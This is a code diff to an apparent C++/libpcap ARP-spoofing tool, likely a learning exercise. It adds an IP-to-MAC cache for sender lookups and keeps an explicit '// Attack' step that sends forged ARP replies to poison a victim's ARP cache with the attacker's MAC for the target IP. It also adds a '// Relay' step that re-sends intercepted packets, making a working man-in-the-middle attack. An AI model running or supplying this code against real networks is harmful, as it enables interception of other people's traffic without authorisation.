@@ -10,6 +10,7 @@
 #include <fcntl.h>
 #include <net/if.h>
 #include <unistd.h>
+#include <map>
 #include "ethhdr.h"
 #include "arphdr.h"
 
@@ -114,6 +115,8 @@ int main(int argc, char* argv[]) {
 	Mac myMac;
 	Ip myIp;
 
+	std::map <Ip, Mac> IpMacMap;
+
 	// Get My Mac, Ip
 	getMacAddress(&myMac, dev);
 	getIpAddress(&myIp, dev);
@@ -130,25 +133,42 @@ int main(int argc, char* argv[]) {
 		Ip targetIp = Ip(argv[rep + 2]);
 
 		// Get Sender Mac
-		res = sendArp(handle, broadcastDmac, myMac, ArpHdr::Request, myMac, myIp, broadcastTmac, senderIp);
-		if (res != 0) {
-			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-		}
+		if (IpMacMap.find(senderIp) != IpMacMap.end())
+			senderMac = IpMacMap[senderIp];
+		else {
+			res = sendArp(handle, broadcastDmac, myMac, ArpHdr::Request, myMac, myIp, broadcastTmac, senderIp);
+			if (res != 0) {
+				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			}
 
-		res = pcap_next_ex(handle, &header, &rpacket);
-		arpreply = *(EthArpPacket*)rpacket;
-
-		while (arpreply.eth_.type() != 0x0806) {
 			res = pcap_next_ex(handle, &header, &rpacket);
 			arpreply = *(EthArpPacket*)rpacket;
-		}
 
-		senderMac = arpreply.eth_.smac_;
+			while (arpreply.eth_.type() != 0x0806) {
+				res = pcap_next_ex(handle, &header, &rpacket);
+				arpreply = *(EthArpPacket*)rpacket;
+			}
+
+			senderMac = arpreply.eth_.smac_;
+			IpMacMap[senderIp] = senderMac;
+		}
 
 		// Attack
 		res = sendArp(handle, senderMac, myMac, ArpHdr::Reply, myMac, targetIp, senderMac, senderIp);
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		}
+
+		// Relay
+		EthArpPacket relayPacket;
+		pcap_next_ex(handle, &header, &rpacket);
+		relayPacket = *(EthArpPacket*)rpacket;
+
+		if (relayPacket.arp_.sip_ == senderIp) {
+			res = sendArp(handle, relayPacket.eth_.dmac_, relayPacket.eth_.smac_, ArpHdr::Request, relayPacket.arp_.smac_, relayPacket.arp_.sip_, relayPacket.arp_.tmac_, relayPacket.arp_.tip_);
+			if (res != 0) {
+				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			}
 		}
 
 	}
